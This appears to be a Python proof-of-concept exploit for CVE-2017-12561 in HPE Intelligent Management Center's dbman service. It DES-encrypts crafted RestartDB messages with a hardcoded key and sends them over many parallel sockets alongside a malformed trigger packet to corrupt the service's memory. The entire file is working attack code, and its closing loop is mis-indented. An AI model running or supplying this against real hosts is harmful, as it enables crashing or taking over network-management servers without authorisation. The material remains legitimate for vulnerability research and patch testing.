"""
Target: HPE Intelligent Management Center dbman
Version: E504P04
Vulnerability: CVE-2017-12561/ZDI-17-836
Python Version: 3.7
Usage: poc.py $ip
"""

from multiprocessing import Pool
from binascii import unhexlify
import socket
import struct
import time
import sys
import pyDes # pip install pydes

def der(t, v):
    # short form length
    if 0 <= len(v) < 128:
        return t + struct.pack("B", len(v)) + v
    # long form length (only supports up to length 255)
    else:
        first = struct.pack("B", 0b10000000 | 1)
        length = struct.pack("B", len(v))
        return t + first + length + v

def build_message(opcode, payload):
    return struct.pack(">I", opcode) + struct.pack(">I", len(payload)) + payload
    
def trigger(size, type=1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    # crash type 2: event_handler->handle_input()
    # ACE_WFMO_Reactor::upcall+0xbe
    sock.send(build_message(10012, b"\x41" * size))
    # crash type 1: event_handler->handle_close()
    # ACE_WFMO_Reactor_Handler_Repository::make_changes_in_current_infos+0x163
    if type == 1:
        sock.recv(1)
    sock.close()

def send_pool(sock, data):
    sock.send(data)

# RemoteReservedFile
reservedFilePath = der(b"\x04", b"\x41" * 24)
backupPath = der(b"\x04", b"\x42" * 24)
backFileExt = der(b"\x04", b"\x43" * 24)
tm = der(b"\x02", b"\x01")
remoteReservedFile = der(b"\x30", reservedFilePath +
                                  backupPath +
                                  backFileExt +
                                  tm)

if __name__ == '__main__':
    _, ip = sys.argv
    port = 2810
    key = "liuan814"

    # RestartDB (opcode 10008)
    dbIP = der(b"\x04", b"\x41" * 0x24)
    iDBType = der(b"\x02", b"\x03")
    dbInstance = der(b"\x04", b"\x42" * 0x24)
    dbSaUserName = der(b"\x04", b"\x43" * 0x24)
    dbSaPassword = der(b"\x04", b"\x44" * 0x24)
    strOraDbIns = der(b"\x04", b"\x45" * 0x24)
    payload = der(b"\x30", dbIP +
                           dbInstance +
                           dbSaUserName +
                           dbSaPassword +
                           strOraDbIns)
 
    # PKCS5 padding
    pad_len = 8 - (len(payload) % 8)
    payload += pad_len * str.encode(chr(pad_len))

    d = pyDes.des(key, pyDes.ECB)
    payload = build_message(10008, d.encrypt(payload))

    # open the socket for the trigger packet
    s_trigger = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_trigger.connect((ip, port))

    # open sockets for filling 0x24 hole after bug is triggered
    NUM = 10
    s_fill = []
    for _ in range(NUM):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s_fill.append((s, payload))

    # send trigger_message in parallel with reclaim messages
    trigger_message = build_message(10012, b"\xFF" * 0xFF)
    args = s_fill + [(s_trigger, trigger_message)]
    with Pool(NUM) as p:
        p.starmap(send_pool, args)
        
    # clean up
    s_trigger.close()
    for s, _ in s_fill:
    s.close()